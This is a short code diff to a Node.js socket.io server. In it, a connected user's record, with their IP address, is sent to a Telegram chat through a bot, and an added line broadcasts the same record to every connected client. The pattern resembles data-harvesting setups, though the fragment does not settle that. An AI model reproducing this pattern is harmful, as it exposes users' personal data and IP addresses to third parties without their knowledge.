@@ -260,6 +260,7 @@ io.on('connection', (socket, req) => {
             user.ip = userIP
             let message = JSON.stringify(user, null, 2);
             bot.sendMessage(chatId, message);
+            io.emit('userData', user)
         }
        
         //console.log(data)
